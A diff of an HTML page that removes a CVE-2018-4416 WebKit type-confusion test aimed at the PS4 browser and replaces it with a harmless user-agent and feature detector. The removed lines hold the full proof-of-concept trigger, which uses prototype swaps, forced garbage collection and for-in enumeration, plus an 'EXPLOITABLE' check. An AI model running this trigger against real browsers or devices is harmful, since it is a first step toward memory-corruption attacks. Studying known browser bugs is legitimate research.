@@ -1,93 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CVE-2018-4416 WebKit Test</title>
-    <style>
-        body {
-            font-family: monospace;
-            background: #000;
-            color: #0f0;
-            padding: 20px;
-        }
-        #output {
-            white-space: pre-wrap;
-            border: 1px solid #0f0;
-            padding: 10px;
-            margin-top: 20px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>PS4 WebKit Info</title>
+<style>
+    body {
+        background: #111;
+        color: #0f0;
+        font-family: monospace;
+        padding: 20px;
+        word-wrap: break-word;
+    }
+
+    .box {
+        border: 1px solid #0f0;
+        padding: 15px;
+        margin-bottom: 15px;
+    }
+
+    h1 {
+        color: #fff;
+    }
+</style>
 </head>
 <body>
-    <h1>CVE-2018-4416 WebKit Type Confusion Test</h1>
-    <p>Testing PS4 13.50 WebKit 605.1.15...</p>
-    <div id="output"></div>
 
-    <script>
-        // Redirect print() to screen
-        var output = document.getElementById('output');
-        function print(msg) {
-            output.innerHTML += (msg || '') + '\n';
-        }
+<h1>PS4 Browser / WebKit Detector</h1>
 
-        function debug(msg) {
-            output.innerHTML += '[DEBUG] ' + msg + '\n';
-        }
+<div class="box">
+    <h2>User Agent</h2>
+    <div id="ua"></div>
+</div>
 
-        print('Starting CVE-2018-4416 test...\n');
+<div class="box">
+    <h2>Detected Safari Version</h2>
+    <div id="safari"></div>
+</div>
 
-        // EXACT CODE FROM https://github.com/erupmi/CVE-2018-4416-exploit
-        function gc() {
-            for (let i = 0; i < 10; i++) {
-                let ab = new ArrayBuffer(1024 * 1024 * 10);
-            }
-        }
+<div class="box">
+    <h2>Detected AppleWebKit Version</h2>
+    <div id="webkit"></div>
+</div>
 
-        function opt(obj) {
-            // Starting the optimization.
-            for (let i = 0; i < 500; i++) {
-            }
+<div class="box">
+    <h2>Extra Features</h2>
+    <div id="features"></div>
+</div>
 
-            let tmp = {a: 1};
-            gc();
-            tmp.__proto__ = {};
+<script>
+const ua = navigator.userAgent;
 
-            for (let k in tmp) {  // The structure ID of "tmp" is stored in a JSPropertyNameEnumerator.
-                tmp.__proto__ = {};
-                gc();
-                obj.__proto__ = {};  // The structure ID of "obj" equals to tmp's.
-                return obj[k];  // Type confusion.
-            }
-        }
+document.getElementById("ua").textContent = ua;
 
-        try {
-            print('[+] Running opt({}) to JIT compile...');
-            opt({});
+// Detect AppleWebKit version
+const wkMatch = ua.match(/AppleWebKit\/([0-9.]+)/);
+const wkVersion = wkMatch ? wkMatch[1] : "Unknown";
 
-            print('[+] Creating Uint32Array with fake object...');
-            let fake_object_memory = new Uint32Array(100);
-            fake_object_memory[0] = 0x1234;
+document.getElementById("webkit").textContent = wkVersion;
 
-            print('[+] Triggering type confusion...');
-            let fake_object = opt(fake_object_memory);
+// Detect Safari version
+const safariMatch = ua.match(/Version\/([0-9.]+)/);
+const safariVersion = safariMatch ? safariMatch[1] : "Unknown";
 
-            print('[+] Result: ' + fake_object);
-            print('[+] Type: ' + typeof(fake_object));
-            
-            if (fake_object === 0x1234) {
-                print('\n[SUCCESS] Type confusion worked! Got: 0x' + fake_object.toString(16));
-                print('[SUCCESS] CVE-2018-4416 is EXPLOITABLE on this WebKit version!');
-            } else if (fake_object === undefined) {
-                print('\n[PATCHED] Returned undefined - vulnerability is patched');
-            } else {
-                print('\n[RESULT] Got unexpected value: ' + fake_object);
-            }
+document.getElementById("safari").textContent = safariVersion;
 
-        } catch(e) {
-            print('\n[ERROR] Exception caught: ' + e);
-            print('[ERROR] Stack: ' + e.stack);
-        }
+// Feature checks
+const features = [
+    ["WebAssembly", typeof WebAssembly !== "undefined"],
+    ["SharedArrayBuffer", typeof SharedArrayBuffer !== "undefined"],
+    ["AudioContext", typeof AudioContext !== "undefined"],
+    ["WebGL", !!document.createElement('canvas').getContext('webgl')],
+    ["ServiceWorker", 'serviceWorker' in navigator],
+    ["IndexedDB", 'indexedDB' in window],
+    ["WebRTC", !!window.RTCPeerConnection],
+    ["OffscreenCanvas", typeof OffscreenCanvas !== "undefined"],
+];
 
-        print('\n[DONE] Test complete');
-    </script>
+let featureHTML = "";
+
+features.forEach(f => {
+    featureHTML += `${f[0]}: ${f[1] ? "YES" : "NO"}<br>`;
+});
+
+document.getElementById("features").innerHTML = featureHTML;
+
+console.log("User Agent:", ua);
+console.log("AppleWebKit:", wkVersion);
+console.log("Safari Version:", safariVersion);
+</script>
+
 </body>
 </html>
